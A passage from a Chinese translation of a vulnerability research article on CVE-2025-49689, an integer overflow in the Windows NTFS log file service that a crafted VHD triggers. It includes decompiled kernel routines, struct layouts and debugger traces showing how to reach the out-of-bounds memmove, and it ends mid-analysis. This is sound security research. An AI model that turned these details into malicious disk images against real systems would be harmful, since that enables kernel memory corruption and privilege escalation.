> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxODM5ODQzNQ==&mid=2247489439&idx=1&sn=2a7b9da658dc0f6481886eef74bd95ac

#  日志中的秘密：利用一个存在 20 年的 NTFS 漏洞  
Sergey Tarasov  securitainment   2025-07-13 09:17  
  
> Buried in the Log. Exploiting a 20 years old NTFS Vulnerability   
  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
## 引言  
  
文件系统的实现历史悠久且复杂，但并未得到独立研究人员的充分审计。本文将分享我在 Windows NTFS 实现中发现的一个漏洞的精彩利用案例。该漏洞CVE-2025-49689可通过特定构造的虚拟磁盘 (VHD) 触发。  
  
攻击者常在钓鱼攻击中使用虚拟磁盘作为恶意载荷的容器。从用户角度来看，虚拟磁盘就像一个包含文件的容器，类似于 ZIP 或 RAR 压缩包。最近我的同事发布了一份关于钓鱼攻击的报告，其中就使用了虚拟磁盘。高级攻击者尝试利用虚拟磁盘基础设施进行漏洞利用只是时间问题。  
  
2025 年报告了 4 个在野利用的漏洞，其中 2 个是远程代码执行 (RCE)，2 个是信息泄露漏洞，其中 1 个信息泄露漏洞与 RCE 形成漏洞链。4 个漏洞中有 3 个使用 VHD 作为容器来触发有缺陷的文件系统实现，这令人印象深刻。在野利用针对 NTFS 和 FastFat 实现分别注册了 CVE-2025-24993 和 CVE-2025-24985。  
  
本文将讨论导致多重损坏的精妙根本原因，这些损坏像瀑布一样层层叠加。最后我们将讨论如何利用该漏洞实现权限提升。  
  
让我们开始吧！  
## 根本原因分析  
  
在开始之前，我需要说明所有定义和内存布局均适用于 Windows 11 22H2 amd64 10.0.22621.5037 版本。  
  
该漏洞位于日志文件服务 (LFS) 实现中，可能在挂载过程中触发，具体实现在
```
ntfs!NtfsMountVolume
```

  
例程中。LFS 旨在为 NTFS 提供日志记录和恢复服务，包括撤销、重做、检查点操作等。根据 LFS 的设计，它可能有多个客户端，但目前只有一个客户端存在，即 NTFS。每个客户端都有自己的 LCH（Log Client Structure）结构，该结构在
```
ntfs!LfsOpenLogFile
```

  
中创建。LCH 的内存布局如下所示。  

```
//ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
00000000 struct LCH // sizeof=0x40
00000000 {
00000000     __int16 NodeTypeCode;
00000002     __int16 NodeByteSize;
...
00000008     LIST_ENTRY LchLinks;
00000018     LFCB *Lfcb;
00000020     LFS_CLIENT_ID ClientId;
...
00000030     __int32 ClientArrayByteOffset;
...
00000038     __int64 Sync;
00000040 };
```

  
LCH 结构中最重要的字段是 **Lfcb**  
。LFCB（Log File Control Block，日志文件控制块）是一个用于存储日志文件状态所有必要信息的结构体，并在几乎所有 LFS **API**  
中被使用。LFCB 的分配和初始化在 
```
ntfs!LfsAllocateLfcb
```

  
例程中完成。下方展示了 LFCB 的部分内存布局。  

```
//ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
00000000 struct My_LFCB // sizeof=0x268
00000000 {
00000000     __int16 NodeTypeCode;
00000002     __int16 NodeByteSize;
...
00000008     LIST_ENTRY LchLinks;
00000018     __int64 FileObject;
00000020     __int64 FileSize;
00000028     __int32 LogPageSize;
0000002C     __int32 LogPageMask;
00000030     __int32 LogPageInverseMask;
00000034     __int32 LogPageShift;
00000038     __int64 FirstLogPage;
00000040     __int64 field_40;
00000048     __int32 ReusePageOffset;
0000004C     __int32 RestartDataOffset;
00000050     __int16 LogPageDataOffset;
...
00000054     __int32 RestartDataSize;
00000058     __int32 LogPageDataSize;
...
00000060     __int16 RecordHeaderLength;
...
00000068     __int64 SeqNumber;
...
00000078     __int32 SeqNumberBits;
0000007C     __int32 FileDataBits;
...
000000C8     LFS_RESTART_AREA *LfsRestartArea;
000000D0     __int64 ClientArray;
000000D8     __int16 ClientArrayOffset;
...
000000E0     __int64 CachedRestartArea;
000000E8     __int32 CachedRestartAreaSize;
000000EC     __int32 RestartAreaLength;
...
00000100     __int16 LogClients;
...
00000118     __int64 LastFlushedLsn;
...
00000170     __int64 TotalAvailable;
00000178     __int64 TotalAvailInPages;
00000180     __int64 TotalUndoCommitment;
00000188     __int64 MaxCurrentAvail;
00000190     __int64 CurrentAvailable;
00000198     __int32 ReservedLogPageSize;
...
000001A0     __int16 RestartUsaOffset;
000001A2     __int16 UsaArraySize;
000001A4     __int16 LogRecordUsaOffset;
000001A6     __int16 MajorVersion;
000001A8     __int16 MinorVersion;
..
000001AC     __int32 Flags;
...
00000228     __int64 ReservedBuffes;
...
00000240     __int64 pfnTxfFlushTxfLsnForNtfsLsn;
...
00000250     __int64 pfnNtfsSendLogEvent;
...
00000268 };
```

  
在我们的分析中需要关注以下关键字段：  
- 
```
TotalAvailable
```

  
：表示日志记录可用的字节数。该值在
```
ntfs!LfsUpdateLfcbFromRestart
```

  
函数中计算，数据来源于
```
LFS_RESTART_AREA
```

  
结构。该磁盘存储结构在取证领域已被深入研究，你可以在这里、这里和这里找到相关文件结构和逻辑的描述。  
  
- 
```
RecordHeaderLength
```

  
：该字段为常量值，实际等于
```
sizeof(LFS_RECORD) == 30h
```

  
  
LFS（Log File Service）对客户端提交的内容是不透明的，为了能够处理任意数据，LFS 会将客户端数据封装到
```
LFS_RECORD
```

  
结构中。该结构的内存布局如下：  

```
//ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
00000000 struct LFS_RECORD // sizeof=0x30
00000000 {
00000000     __int64 ThisLsn;
00000008     __int64 ClientPreviousLsn;
00000010     __int64 ClientUndoNextLsn;
00000018     __int32 ClientDataLength;
0000001C     LFS_CLIENT_ID ClientId;
00000020     __int32 RecordType;
00000024     __int32 TransactionId;
00000028     __int16 Flags;
0000002A     __int16 AlignWord;
0000002C     __int8 ClientData[4];
00000030 };
```

  
如你所见，
```
LFS_RECORD
```

  
结构体包含
```
ClientDataLength
```

  
字段和
```
ClientData
```

  
字段，后者实际存储了 LFS 客户端传递的数据及其长度。LFS（Log File Service）由
```
NTFS.sys
```

  
中众多以 Lfs 为前缀的例程实现。其中
```
ntfs!LfsFindLogRecord
```

  
函数负责解析和验证
```
LFS_RECORD
```

  
实例。该函数会检查
```
LfsRecord->ClientDataLength + Lfcb->RecordHeaderLength
```

  
是否小于等于
```
Lfcb->TotalAvailable
```

  
。下图展示了该检查的代码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibzFzibktN0w8eBYkKibaKCKHswoHhqKCtHXC1gIQB3FM13P4iaJQ5qm4Qg/640?wx_fmt=png&from=appmsg "")  
  

```
ntfs!LfsFindLogRecord
```

  
的反编译代码  
  
该检查的汇编形式如下：  

```
PAGE:00000001C015472B 44 8B 41 18              mov     r8d, [rcx+18h]          ; ClientDataLength
PAGE:00000001C015472F 0F B7 57 60              movzx   edx, word ptr [rdi+60h] ; RecordHeaderLength
PAGE:00000001C0154733 41 03 D0                 add     edx, r8d                ; ClientDataLength + RecordHeaderLength
PAGE:00000001C0154736 8B C2                    mov     eax, edx
PAGE:00000001C0154738 48 3B 87 70 01 00 00     cmp     rax, [rdi+170h]         ; TotalAvailable
PAGE:00000001C015473F 7D 47                    jge     short loc_1C0154788
```

  
该检查在整数溢出防护方面存在缺陷，因为攻击者可以轻易修改 VHD（Virtual Hard Disk）文件内容，从而篡改 LFS（Log File Service）结构体中的
```
ClientDataLength
```

  
字段值。攻击者可以将该字段设置为一个极大值，如 FFFFFFFFh，从而成功绕过检查。例如，当
```
ClientDataLength
```

  
字段被设置为 FFFFFFFFh 时，加上 30h 后结果变为 2Fh ，检查将被绕过，但该字段仍保持 FFFFFFFFh 的原始值，如果后续代码使用该字段，可能导致内存破坏（Memory Corruption）漏洞。  
## 从整数溢出到内存破坏  
  
如反编译代码
```
ntfs!LfsFindLogRecord
```

  
所示，该函数通过指针参数将
```
LFS_RECORD
```

  
结构体中的多个字段返回给调用者。其中
```
ClientDataLength
```

  
字段值通过第 8 个参数（argument #8）返回。  

```
__int32 __fastcall LfsFindLogRecord(
        My_LFCB *a1,
        My_LEB *Leb,
        __int64 Lsn,
        __int32 *RecordType,
        __int32 *TableLength,
        __int64 *ClientUndoNextLsn,
        __int64 *ClientPreviousLsn,
        __int32 *CurrentLogRecordLength,
        My_NTFS_LOG_RECORD_HEADER **CurrentLogRecord,
        __int32 *pStatus)
{
...
  *RecordType = (*p_RecordHeader)->RecordType;
  *TableLength = (*p_RecordHeader)->TransactionId;
  *ClientUndoNextLsn = (*p_RecordHeader)->ClientUndoNextLsn;
  *ClientPreviousLsn = (*p_RecordHeader)->ClientPreviousLsn;
  *LogRecord = Leb->CurrentLogRecord;
  result = (int)LogRecordLength;
  *LogRecordLength = (*p_RecordHeader)->ClientDataLength; // this value should be tracked back (arg #8)
  return result;
}
```

  

```
ntfs!LfsFindLogRecord
```

  
函数在
```
NTFS.sys
```

  
中有两处调用，分别来自
```
ntfs!LfsReadLogRecord
```

  
和
```
ntfs!LfsReadNextLogRecord
```

  
。
```
ntfs!LfsReadNextLogRecord
```

  
在分析阶段被调用，严格来说也可以通过挂载过程访问，但相比
```
ntfs!LfsReadLogRecord
```

  
，其设置要复杂得多。
```
ntfs!LfsReadLogRecord
```

  
负责填充 LEB（Log Enumeration Block，日志枚举块）结构体。部分反编译代码如下所示。  

```
void __fastcall LfsReadLogRecord(My_LCH *a1, __int64 Lsn, __int32 ContextMode, My_LEB *Leb, __int32 *Status) {
...
 memset(Leb, 0, sizeof(My_LEB));
  *(_DWORD *)&Leb->NodeTypeCode = 0x580800;
  Leb->ClientId = (__int32)a1->ClientId;
  Leb->ContextMode = ContextMode;
  LfsFindLogRecord(
    Lfcb,
    Leb,
    Lsn,
    &Leb->RecordType,
    &Leb->TableLength,                          // if ( (a7 & 1) == 0 && ((unsigned __int64)a5 - 0x18) % a6 )
    &Leb->ClientUndoNextLsn,
    &Leb->ClientPreviousLsn,
    &Leb->CurrentLogRecordLength,
    &Leb->CurrentLogRecord,
    Status);
  RecordHeader = Leb->RecordHeader;
  Leb->NoRedo = (RecordHeader->Flags & 2) != 0; // or: 2,3,4,5,6,7,10,11,12,13,14,15,18,19,20,21,22,23,26,27,28,29,30,31,34,35,36,37
  Leb->NoUndo = (RecordHeader->Flags & 4) != 0; // and: 0x6,0x7,0xe,0xf,0x16,0x17,0x1e,0x1f
  LfsReleaseLch((__int64)a1);
...
}
00000000 struct LEB // sizeof=0x58
00000000 {
00000000     __int16 NodeTypeCode;
00000002     __int16 NodeByteSize;
...
00000008     My_LFS_RECORD_HEADER *RecordHeader;
00000010     __int64 RecordHeaderBcb;
00000018     __int32 ContextMode;
0000001C     __int32 ClientId;
...
00000028     __int64 ClientUndoNextLsn;
00000030     __int64 ClientPreviousLsn;
00000038     __int32 RecordType;
0000003C     __int32 TableLength;
00000040     __int32 CurrentLogRecordLength;
..
00000048     My_NTFS_LOG_RECORD_HEADER *CurrentLogRecord;
00000048
00000050     __int8 AuxilaryBuffer;
00000051     __int8 NoRedo;
00000052     __int8 NoUndo;
...
00000058 };
```

  

```
ntfs!LfsReadLogRecord
```

  
可以通过多个不同函数调用，但只有 
```
ntfs!ReadRestartTable
```

  
能在挂载过程中直接访问，且其调用路径不涉及分析过程。
```
ntfs!ReadRestartTable
```

  
本质上是对 
```
ntfs!LfsReadLogRecord
```

  
的封装，增加了对 
```
My_NTFS_LOG_RECORD_HEADER
```

  
（通过 
```
ntfs!NtfsCheckLogRecord
```

  
验证）和 
```
RESTART_TABLE
```

  
（通过 
```
ntfs!NtfsCheckRestartTable
```

  
验证）的校验。这两个结构的内存布局如下：  

```
00000000 struct RESTART_TABLE // sizeof=0x18
00000000 {
00000000     __int16 EntrySize;
00000002     __int16 NumberEntries;
00000004     __int16 NumberAllocated;
00000006     __int16 Reserved[3];
0000000C     __int32 FreeGoal;
00000010     __int32 FirstFree;
00000014     __int32 LastFree;
00000018 };
```


```
00000000 struct NTFS_LOG_RECORD_HEADER // sizeof=0x28
00000000 {
00000000     __int16 RedoOperation;
00000002     __int16 UndoOperation;
00000004     __int16 RedoOffset;
00000006     __int16 RedoLength;
00000008     __int16 UndoOffset;
0000000A     __int16 UndoLength;
0000000C     __int16 TargetAttribute;
0000000E     __int16 LcnsToFollow;
00000010     __int16 RecordOffset;
00000012     __int16 AttributeOffset;
00000014     __int16 ClusterBlockOffset;
00000016     __int16 Reserved;
00000018     __int64 TargetVcn;
00000020     __int64 LcnsForPage[1];
00000028 };
```

  

```
ntfs!NtfsCheckLogRecord
```

  
和 
```
ntfs!NtfsCheckRestartTable
```

  
都使用了 
```
CurrentLogRecordLength
```

  
(
```
ClientDataLength
```

  
) 字段。由于预期的 
```
CurrentLogRecordLength
```

  
值极高，且我们控制了 
```
RedoLength
```

  
、
```
UndoLength
```

  
、
```
RedoOffset
```

  
、
```
UndoOffset
```

  
的值，
```
ntfs!NtfsCheckRestartTable
```

  
中的所有检查都会被自动绕过。以下是 
```
CurrentLogRecordLength
```

  
字段相关的检查列表：  
- 
```
CurrentLogRecordLength
```

  
应大于 **28h**  
  
- 
```
LogRecord->RedoLength
```

  
+ 
```
LogRecord->RedoOffset
```

  
应小于 
```
CurrentLogRecordLength
```

  
  
- 
```
LogRecord->UndoLength
```

  
+ 
```
LogRecord->UndoOffset
```

  
应小于 
```
CurrentLogRecordLength
```

  
  

```
ntfs!NtfsCheckRestartTable
```

  
的检查也类似，但它使用 
```
TableSize
```

  
值进行验证，
```
TableSize
```

  
的计算公式为 
```
TableSize = CurrentLogRecordLength - LogRecord->RedoOffset
```

  
。同样，由于我们控制了 
```
EntrySize
```

  
、
```
NumberEntries
```

  
等字段的内容，所有这些检查都可以被绕过。以下是 
```
TableSize
```

  
值相关的检查列表：  
- 
```
RestartTable->EntrySize
```

  
应小于 
```
TableSize
```

  
  
- 
```
RestartTable->EntrySize + 18h (entry header 的大小)
```

  
应小于 
```
TableSize
```

  
  
- 
```
(TableSize - 18h) / RestartTable->EntrySize
```

  
应小于 
```
RestartTable->NumberEntries
```

  
  
让我们回到 
```
ntfs!ReadRestartTable
```

  
。它不仅读取和验证 
```
LogRecord
```

  
，实际上还会返回指向 
```
RESTART_TABLE
```

  
数据的指针和表的长度。其计算方式如下：  

```
__int64 __fastcall ReadRestartTable(
        My_IRP_CONTEXT *IrpContext,
        My_VCB *Vcb,
        __int64 Lsn,
        My_LEB *Leb,
        _DWORD *RestartTableLength)
{
...
  *RestartTableLength = Leb->CurrentLogRecordLength - LogRecordOffset;
  return (__int64)CurrentLogRecord + LogRecordOffset;
}
```

  
现在我们可以深入查看 
```
ntfs!InitializeRestartState
```

  
函数。该函数负责加载所有重启表（Restart Table），并在 
```
ntfs!AnalysisPass
```

  
开始前完成准备工作。在这里，我们可以看到对 
```
ntfs!ReadRestartTable
```

  
的多次调用，用于处理不同的重启表（如 Open Attribute Table、Transaction Table、Dirty Page Table 等）。这些调用通常伴随着以下代码序列：  
1. 
```
nt!ExAllocatePoolWithTag
```

  
调用，使用 tag **5246744Eh**  
(**NtfR**  
) 并分配大小为 
```
RestartAreaLength
```

  
的内存  
  
1. 
```
nt!memove
```

  
调用，将目标地址设置为上一步分配的内存指针，源地址设置为重启表数据的指针，长度设置为 
```
RestartAreaLength
```

  
的值  
  
如果我们能够执行到这段代码，将会发生越界读取（out-of-bounds read），因为重启表数据所在的缓冲区显然没有足够的数据来完成这个操作而不造成损坏。我们能够创建的最小 VHD 大小为 8MB，而这个 memmove 操作需要 4GB+ 的数据才能完成。看起来很简单，不是吗？让我们尝试触发这段代码。  
## 触发条件  
  
首先我们需要创建一个 **VHD**  
，这可以通过标准的 **WinAPI**  
CreateVirtualDisk 轻松实现（微软提供的示例代码可以在这里找到）。在我的实验中，我使用了 
```
CREATE_VIRTUAL_DISK_FLAG_FULL_PHYSICAL_ALLOCATION
```

  
标志，并将磁盘大小设置为 **10MB**  
。创建磁盘后，需要创建卷并将其格式化为 NTFS 文件系统。我通过 **磁盘管理**  
工具手动完成了这些操作。  
  
现在让我们尝试挂载我们的磁盘，并在 **WinDBG**  
中为 
```
ntfs!NtfsMountVolume
```

  
设置断点。  

```
Breakpoint 0 hit
rax=ffff940a4d5949b8 rbx=0000000000000000 rcx=ffff940a4d328668
rdx=ffff940a4d594660 rsi=ffff940a4d594660 rdi=0000000000000000
rip=fffff8061d09e190 rsp=ffffdb864a6847c8 rbp=ffffdb864a6848e0
 r8=ffffdb864a684800  r9=ffffdb864a684810 r10=fffff80617b38ce0
r11=0000000000000000 r12=0000000000000001 r13=0000000000000000
r14=ffff940a4d328668 r15=ffff940a4d594660
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0000  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
Ntfs!NtfsMountVolume:
fffff806`1d09e190 4c8bdc          mov     r11,rsp
```

  
我们的磁盘和卷已正确创建并格式化。现在到达了一个良好的起点。让我们继续尝试触发 
```
ntfs!InitializeRestartState
```

  
。  

```
Breakpoint 1 hit
rax=ffffdb864a683ec0 rbx=ffff940a503aa1b0 rcx=ffff940a4d328668
rdx=ffff940a503aa1b0 rsi=ffff940a4d328668 rdi=0000000000000000
rip=fffff8061d0e30cc rsp=ffffdb864a683e78 rbp=ffffdb864a6848e0
 r8=ffffdb864a683ee0  r9=ffffdb864a683eb8 r10=fffff80617bbfe60
r11=ffffdb864a683fe8 r12=0000000000000000 r13=0000000000000000
r14=ffffdb864a68417e r15=ffff940a503aa1b0
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0000  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
Ntfs!InitializeRestartState:
fffff806`1d0e30cc 4053            push    rbx
```

  
我们新创建的 **VHD**  
几乎已经到达漏洞代码位置。下一站是 
```
ntfs!ReadRestartTable
```

  
。然而我们并没有命中 
```
ntfs!ReadRestartTable
```

  
。系统成功挂载了 **VHD**  
，资源管理器弹出窗口显示文件系统为空。第一个假设是新创建的 **VHD**  
可能没有任何重启表？让我们在十六进制编辑器中打开目标 **VHD**  
，尝试查找 
```
RSTR
```

  
和 
```
RCRD
```

  
魔数（
```
LFS_RESTART_PAGE
```

  
和 
```
LFS_RECORD_PAGE
```

  
），可以很快确认至少存在重启页面。  
  
现在让我们向前追踪 
```
ntfs!InitializeRestartState
```

  
，看看哪些代码被执行，哪些没有。通过这个练习，你会发现实际上 
```
ntfs!LfsReadRestartArea
```

  
返回了一些数据，但这些数据随后被 memset 擦除，
```
ntfs!InitializeRestartState
```

  
继续正常执行。
```
ntfs!LfsReadRestartArea
```

  
负责读取 
```
RESTART_AREA
```

  
结构。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibVFzWGibIibkvMtvHse9hia2QibBuVpmpKoYklMkBgCxg3ic5tAytJ5044hQ/640?wx_fmt=png&from=appmsg "")  
  
从上面的反编译代码可以清楚地看到，只有当 
```
bCached
```

  
变量为 **TRUE**  
时，代码才会执行 memset 分支。该变量的值在 
```
ntfs!LfsReadRestartArea
```

  
中定义。下面是 
```
ntfs!LfsReadRestartArea
```

  
的部分反编译代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibiaMHLRNtAUcSroDo0DyO16YnLKMNXNuic0636LfiapxUxO610A5SHw7ow/640?wx_fmt=png&from=appmsg "")  
  
这里有两个选项可以阻止 
```
bCached
```

  
被设置为 **TRUE**  
：  
- 阻止 
```
Lfcb->CachedRestartArea
```

  
的初始化。该指针是 
```
RESTART_AREA
```

  
的数据源  
  
- 修改 
```
ClientRestartLsn
```

  
字段的值。其偏移量为 **08h**  
  
让我们再次命中 
```
ntfs!LfsReadRestartArea
```

  
，查看 
```
LFCB->ClientArray
```

  
的内容。第一次命中发生在以下位置：  

```
1: kd> K
 # Child-SP          RetAddr               Call Site
00 ffffaf86`4ea4bc58 fffff805`5c468915     Ntfs!LfsReadRestartArea
01 ffffaf86`4ea4bc60 fffff805`5c5c4a1b     Ntfs!LfsCaptureClientRestartArea+0x14d
02 ffffaf86`4ea4bce0 fffff805`5c5c3db6     Ntfs!LfsRestartLogFile+0x967
03 ffffaf86`4ea4be60 fffff805`5c5c5a4c     Ntfs!LfsOpenLogFile+0xb6
04 ffffaf86`4ea4bf00 fffff805`5c59f900     Ntfs!NtfsStartLogFile+0x1b4
05 ffffaf86`4ea4bff0 fffff805`5c55b74b     Ntfs!NtfsMountVolume+0x1770
06 ffffaf86`4ea4c7d0 fffff805`5c4575ab     Ntfs!NtfsCommonFileSystemControl+0xd7
07 ffffaf86`4ea4c8b0 fffff805`58ed8c25     Ntfs!NtfsFspDispatch+0x62b
08 ffffaf86`4ea4ca00 fffff805`58eded97     nt!ExpWorkerThread+0x155
09 ffffaf86`4ea4cbf0 fffff805`59019a24     nt!PspSystemThreadStartup+0x57
0a ffffaf86`4ea4cc40 00000000`00000000     nt!KiStartSystemThread+0x34
```

  

```
ntfs!LfsCaptureClientRestartArea
```

  
函数负责填充重启缓存并设置 
```
Lfcb->CachedRestartArea
```

  
字段。通过 
```
LFCB->ClientArray
```

  
字段指向的 
```
LFS_CLIENT_RECORD
```

  
结构体内容如下所示。  

```
1: kd> p
rax=ffff808146470010 rbx=ffff8081466261f0 rcx=0000000000000001
rdx=0000000000000000 rsi=ffffaf864ea4bcf0 rdi=ffff808146fed890
rip=fffff8055c5e4576 rsp=ffffaf864ea4bbd0 rbp=ffffaf864ea4bf89
 r8=ffffd60cf6f4e6c0  r9=ffffaf864ea4bc01 r10=fffff80558ec5d40
r11=ffffaf864ea4bb60 r12=ffff808146470050 r13=ffffaf864ea4bce8
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei ng nz ac po cy
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040297
Ntfs!LfsReadRestartArea+0x8a:
fffff805`5c5e4576 430fb7442714    movzx   eax,word ptr [r15+r12+14h] ds:002b:ffff8081`46470064=0000
1: kd> db r12
ffff8081`46470050  08 44 18 00 00 00 00 00-15 44 18 00 00 00 00 00  .D.......D......
ffff8081`46470060  ff ff ff ff 00 00 00 00-00 00 00 00 08 00 00 00  ................
ffff8081`46470070  4e 00 54 00 46 00 53 00-00 00 00 00 00 00 00 00  N.T.F.S.........
ffff8081`46470080  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff8081`46470090  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff8081`464700a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff8081`464700b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff8081`464700c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```

  
然而，如果我们继续执行挂载线程并命中从
```
ntfs!InitializeRestartState
```

  
调用的
```
ntfs!LfsReadRestartArea
```

  
函数，我们会注意到
```
LFS_CLIENT_RECORD
```

  
的内容已经发生了变化，此时
```
ntfs!LfsReadRestartArea
```

  
将返回缓存值而非原始值。  

```
rax=0000000000000000 rbx=ffff8081466261f0 rcx=0000000000000001
rdx=0000000000000000 rsi=ffffaf864ea4bb04 rdi=ffff80814710eb70
rip=fffff8055c5e458e rsp=ffffaf864ea4ba30 rbp=ffffaf864ea4c8e0
 r8=ffffd60cf6f51b90  r9=ffffaf864ea4bb01 r10=fffff80558ec5d40
r11=ffffaf864ea4b9c0 r12=ffff808146462050 r13=ffffaf864ea4bb01
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
Ntfs!LfsReadRestartArea+0xa2:
fffff805`5c5e458e 488b97e0000000  mov     rdx,qword ptr [rdi+0E0h] ds:002b:ffff8081`4710ec50=ffff808146493510
0: kd> db r12
ffff8081`46462050  00 00 28 00 00 00 00 00-00 00 00 00 00 00 00 00  ..(.............
ffff8081`46462060  ff ff ff ff 00 00 00 00-00 00 00 00 08 00 00 00  ................
ffff8081`46462070  4e 00 54 00 46 00 53 00-00 00 00 00 00 00 00 00  N.T.F.S.........
ffff8081`46462080  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff8081`46462090  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff8081`464620a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff8081`464620b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff8081`464620c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```

  
这意味着我们不能简单地修改 VHD 中的 
```
ClientRestartLsn
```

  
值，因为它在执行流程中可能会发生变化。我们需要完全阻止缓存操作，以强制在 
```
ntfs!InitializeRestartState
```

  
被调用时读取重启区域。虽然我们可以忽略这一点，因为我们仍然控制着缓存，但需要提醒的是，当 
```
bCached
```

  
字段被设置为 
```
TRUE
```

  
时，会导致从 VHD 获取的数据被擦除。幸运的是，存在一种相当复杂的方法可以阻止 
```
ntfs!LfsCaptureClientRestartArea
```

  
的调用，同时不会破坏 NTFS 文件系统解析器。  
  
让我们来看一下 
```
ntfs!LfsCaptureClientRestartArea
```

  
函数。这是一个相对简单的函数，它会创建一个虚拟的 
```
LCH
```

  
结构体，填充数据，并调用 
```
ntfs!LfsReadRestartArea
```

  
两次。第一次调用用于确定重启区域的大小，第二次调用则实际读取数据。  

```
__int64 __fastcall LfsCaptureClientRestartArea(
        My_LFCB          *Lfcb,
        __int32          *pszBuffer,
        My_RESTART_AREA **pBuffer,
        __int32          *pStatus)
{
...
  restarted = LfsReadRestartArea(LogHandle, (unsigned int *)&NumberOfBytes, 0LL, &v16, v15, v18);
  if ( restarted == 0xC0000023 )
  {
    PoolWithTag = (My_RESTART_AREA *)ExAllocatePoolWithTag((POOL_TYPE)17, (unsigned int)NumberOfBytes, 0x7273664Cu);
    restarted = LfsReadRestartArea(LogHandle, (unsigned int *)&NumberOfBytes, PoolWithTag, &v16, v15, v12);
  }
  if ( restarted >= 0 && !v16 )
  {
    *pBuffer = PoolWithTag;
    *pszBuffer = NumberOfBytes;
  }
...
}
```

  
该函数由 
```
Ntfs!LfsRestartLogFile
```

  
调用。以下是负责条件判断和调用 
```
ntfs!LfsCaptureClientRestartArea
```

  
的反编译代码：  

```
LFCB *LfsRestartLogFile(PFILE_OBJECT FileObject, __int64 a2, int a3, ...)
{
...
if ( (v96->LfsFlags & 0x19) == 0 && *v12 == 11 )// 19h = 10h | 08h | 01h
{
      LfsCaptureClientRestartArea(Lfcb, &v78, &v80, v12);
      ClientData = (PVOID)Lfcb->LastFlushedLsn;
      LfsReleaseLfcb(Lfcb);
      LfsDeallocateLfcb(Lfcb, 1);
      Lfcb = LfsAllocateLfcb(v43, (__int64)v91, v92);
      P = Lfcb;
...
    Lfcb->CachedRestartAreaSize = v78;
      Lfcb->CachedRestartArea = (__int64)v80;
...
}
```

  
从上述分析可以看出，我们需要破坏以下两个条件之一：  
- 强制设置 
```
LfsFlags
```

  
字段的第 4、3 或 0 位  
  
- 阻止 
```
v12
```

  
指针指向的值等于 
```
11
```

  
  
为了理解第一个条件，我们需要对驱动进行深入的反向工程分析，但这里我们只关注这些标志的实际含义：  
- 
```
10h
```

  
：该标志取决于 VCB 结构体偏移 
```
18h
```

  
处的字段值，目前尚未找到设置该值的方法  
  
- 
```
08h
```

  
：当 
```
nt!RtlCheckPortableOperatingSystem
```

  
成功执行并返回 
```
TRUE
```

  
时可能触发，但在正常情况下无法实现。或者需要强制设置 
```
VCB->VcbState
```

  
为 
```
VCB_STATE_FLUSH_VOLUME_ON_IO
```

  
，但目前尚未找到实现方法  
  
- 
```
01h
```

  
：当 
```
VCB_STATE_MOUNT_READ_ONLY
```

  
标志被设置时触发。虽然可以通过创建只读 VHD 来实现，但这会完全禁用负责重启功能的代码。从逻辑上讲，如果没有修改操作，确实不需要维护操作日志  
  
根据目前对 
```
LfsFlags
```

  
的理解，这个方案似乎不可行。让我们继续分析 
```
v12
```

  
及其值的来源。在 
```
ntfs!LfsRestartLogFile
```

  
的执行过程中，局部变量 
```
v12
```

  
被传递给多个函数，通过快速分析可以确定它是一个指向状态值的指针，该值在每个被调用的函数中都会被设置。这意味着我们需要在最近的调用中操纵状态值，即 
```
ntfs!LfsFindLastLsn
```

  
的调用。  
  

```
ntfs!LfsFindLastLsn
```

  
是一个较大的函数，在反编译代码中向下滚动，我们可以找到设置 
```
v12
```

  
指向值的位置。  

```
void __fastcall LfsFindLastLsn(My_LFCB *Lfcb, __int32 *pStatus) {
...
  if ( LastKnownLsn == LastFlushedLsn )
  {
    if ( v112 && (Lfcb->Flags & 0x40000) != 0 )
      v30 = 11;
    *pStatus = v30;
  }
  else
  {
    *pStatus = (LastKnownLsn != Lfcb->LastFlushedLsn) + 2;
  }
...
}
```

  

```
LastKnownLsn
